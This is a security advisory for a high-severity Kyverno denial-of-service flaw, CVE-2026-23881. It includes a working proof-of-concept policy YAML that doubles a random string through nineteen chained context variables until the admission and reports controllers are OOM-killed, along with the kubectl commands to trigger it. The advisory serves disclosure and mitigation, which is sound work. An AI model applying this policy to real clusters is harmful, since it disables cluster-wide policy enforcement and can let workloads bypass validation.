# Kyverno Denial of Service via Context Variable Amplification in Policy Engine

**GHSA**: GHSA-r2rj-wwm5-x6mq | **CVE**: CVE-2026-23881 | **Severity**: high (CVSS 7.7)

**CWE**: CWE-770

**Affected Packages**:
- **github.com/kyverno/kyverno** (go): < 1.15.3
- **github.com/kyverno/kyverno** (go): >= 1.16.0-rc.1, < 1.16.3

## Description

## Summary

Unbounded memory consumption in Kyverno's policy engine allows users with policy creation privileges to cause Denial of Serviceby crafting policies that exponentially amplify string data through context variables.

## Details

For example, the `random()` JMESPath function in `pkg/engine/jmespath/functions.go` generates random strings. Combined with the `join()` function, an attacker can create exponential string amplification through context variable chaining:

The PoC attack uses exponential doubling:
- `l0` = `random('[a-zA-Z0-9]{1000}')` → 1KB
- `l1` = `join('', [l0, l0])` → 2KB
- `l2` = `join('', [l1, l1])` → 4KB
- ... continues to `l18` → 256MB

The context evaluation has no cumulative size limit, allowing unbounded memory allocation.

## PoC

Tested on Kyverno v1.16.1 on k8s v1.34.0 (kind).

1. Create namespace:
```bash
kubectl create namespace poc-test
```

2. Observe pod statuses from `kyverno` namespace on another terminal:
```bash
kubectl get pods -n kyverno -w
```

2. Apply malicious policy:
```yaml
apiVersion: kyverno.io/v1
kind: Policy
metadata:
  name: memory-exhaustion-poc
  namespace: poc-test
spec:
  validationFailureAction: Enforce
  rules:
    - name: exhaust-memory
      match:
        any:
          - resources:
              kinds:
                - ConfigMap
      context:
        - name: l0
          variable:
            jmesPath: random('[a-zA-Z0-9]{1000}')
        - name: l1
          variable:
            jmesPath: join('', [l0, l0])
        - name: l2
          variable:
            jmesPath: join('', [l1, l1])
        - name: l3
          variable:
            jmesPath: join('', [l2, l2])
        - name: l4
          variable:
            jmesPath: join('', [l3, l3])
        - name: l5
          variable:
            jmesPath: join('', [l4, l4])
        - name: l6
          variable:
            jmesPath: join('', [l5, l5])
        - name: l7
          variable:
            jmesPath: join('', [l6, l6])
        - name: l8
          variable:
            jmesPath: join('', [l7, l7])
        - name: l9
          variable:
            jmesPath: join('', [l8, l8])
        - name: l10
          variable:
            jmesPath: join('', [l9, l9])
        - name: l11
          variable:
            jmesPath: join('', [l10, l10])
        - name: l12
          variable:
            jmesPath: join('', [l11, l11])
        - name: l13
          variable:
            jmesPath: join('', [l12, l12])
        - name: l14
          variable:
            jmesPath: join('', [l13, l13])
        - name: l15
          variable:
            jmesPath: join('', [l14, l14])
        - name: l16
          variable:
            jmesPath: join('', [l15, l15])
        - name: l17
          variable:
            jmesPath: join('', [l16, l16])
        - name: l18
          variable:
            jmesPath: join('', [l17, l17])
      validate:
        message: "Memory exhaustion PoC"
        deny:
          conditions:
            any:
              - key: "{{ l18 }}"
                operator: Equals
                value: "impossible-match"
```

As soon as you apply this, you'll see the reports controller gets OOM killed and the container enters a crash loop.

4. Trigger policy evaluation on the admission controller:
```bash
kubectl create configmap trigger -n poc-test --from-literal=key=value
```

Response:

```
error: failed to create configmap: Internal error occurred: failed calling webhook "validate.kyverno.svc-fail": failed to call webhook: Post "https://kyverno-svc.kyverno.svc:443/validate/fail?timeout=10s": EOF
```

The Kyverno admission controller has allocated ~256MB of memory per policy evaluation. The default memory limit from the Helm chart is 256 MB, and the process crashes.

5. Check pod status from the `kyverno` namespace:

```bash
kubectl get pods -n kyverno
```

Outputs:

```
kyverno              kyverno-admission-controller-58cb4b76c9-wd45p    0/1     OOMKilled          1 (20s ago)   178m
kyverno              kyverno-reports-controller-576566fb98-pfb2f      0/1     OOMKilled          1 (1s ago)   178m
```

While the reports controller is in a crash loop, the admission controller crashes only on trigger. You can re-run the same `kubectl create configmap` command from above and reproduce the crash.


## Impact

Denial of Service with cluster-wide security impact. Users with `Policy` or `ClusterPolicy` creation privileges can exhaust memory in the Kyverno admission controller and the reports controller, causing:

- Pod OOMKill and service disruption
- No logs on why the crash occurred (admission controller, reports controller)
- Cluster-wide policy enforcement disabled and security policies stop being evaluated
- If `failurePolicy: Ignore` is configured, workloads bypass all validation during outage
- Applications depending on Kyverno mutations may deploy with incorrect configurations

Any Kyverno deployment where non-admin users can create policies (e.g., namespace-scoped Policy resources) is affected.

## Mitigation

Add a context size limit to prevent unbounded memory allocation during policy evaluation.
